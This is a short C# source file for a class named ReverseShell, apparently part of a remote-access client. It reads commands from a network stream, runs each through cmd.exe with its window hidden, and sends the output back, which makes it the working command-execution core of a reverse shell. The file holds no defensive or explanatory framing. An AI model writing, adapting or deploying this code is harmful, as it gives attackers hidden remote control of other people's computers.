using Nethereum.ABI.CompilationMetadata;
using Protocol;
using System.Diagnostics;
using System.IO;

namespace Client3
{
    static class ReverseShell
    {
        public static void ReverseShellClient(Stream stream)
        {

            int numberCommands = int.Parse(stream.ReadString());



            for (int i = 0; i < numberCommands; i++)
            {
                var command = stream.ReadString();

                var proc = new Process();

                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = $"/c {command}";

                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;

                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.CreateNoWindow = true;

                proc.Start();

                var commandResult = proc.StandardOutput.ReadToEnd();

                proc.WaitForExit();

                stream.WriteString(commandResult);
            }
        }
    }
}
